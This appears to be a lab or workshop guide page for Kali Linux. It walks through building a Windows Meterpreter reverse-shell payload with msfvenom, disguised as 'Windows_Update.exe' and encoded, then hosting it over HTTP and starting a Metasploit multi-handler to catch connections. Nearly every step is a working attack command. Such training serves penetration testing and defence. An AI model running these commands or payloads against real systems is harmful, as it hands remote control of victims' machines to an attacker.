---
title: Using Kali Linux
menuTitle: Command & Control
weight: 5
---

![](kali_logo.png?width=300px)

### Create A Payload

1. Check the IP address of your Kali machine. You'll need this to configure the payload we're about to generate.
    - ```ip addr show eth0```
2. Create a new directory named "payloads" and then change to that directory:
    - ```mkdir payloads```
    - ```cd payloads```
3. You'll use a tool called [MSFvenom](https://www.offsec.com/metasploit-unleashed/msfvenom/) to create a custom payload for your target. The following command will create a file named *"Windows_Update.exe"* in the *"payloads"* directory. Pay close attention to the **lhost** argument, this will need to be the ip address of your Kali machine that we checked in step 1. The **lport** argument is the port that we'll use later when we configure a *listener*:
    - ```msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai -i 1 lport=8443 lhost=192.168.157.134 -b "\x00" -f exe -o Windows_Update.exe```
4. Finally, you'll start a simple HTTP server so that you can serve the newly created payload to your target:
    - `python3 -m http.server`
5. This is an example of what the expected commands and output will look like:
![payload](01_payload.png?width=700px)

{{% notice note %}}Please note that in this case the HTTP server is listening on port **8000**. Your instance may be different, or you can issue other commands to change the port to one that you may prefer.{{% /notice %}}

### Setting Up Metasploit for Command & Control (C2)

Now we'll use [Metasploit](https://www.metasploit.com/) to create a *handler* that will listen for connections as a result of our payload. This is known as a *reverse shell*.

1. The msfconsole is probably the most popular interface to the Metasploit Framework (MSF). It provides an “all-in-one” centralized console and allows you efficient access to virtually all of the options available in the MSF:
    - `msfconsole`
2. Next, we tell it that we’d like to use the generic payload handler, the “multi-handler” module.
    - `use exploit/multi/handler`
3. We need to tell the multi-handler what payload type is connecting back, using the same value we used in our msfvenom command:
    - `set PAYLOAD windows/meterpreter/reverse_https`
4. We need to tell the multi-handler what IP address to listen on – this will correspond to the LHOST value we set in our msfvenom command:
    - `set LHOST 192.168.157.134`
5. We'll also set the listening port to correspond to the LPORT value we set in our msfvenom command:
    - `set LPORT 8443`
6. `set ExitOnSession false`
7. Finally, we run “exploit” to start this module, passing the “-j” option to make this a background job, allowing us to continue running other commands in Metasploit, if we like:
    - `exploit -j`
8. This is an example of what the expected commands and output will look like:
![msfconsole](02_msfconsole.png?width=700px)

### Going Further :rocket:
- To see all the fun stuff that Meterpreter can do use the `help` command
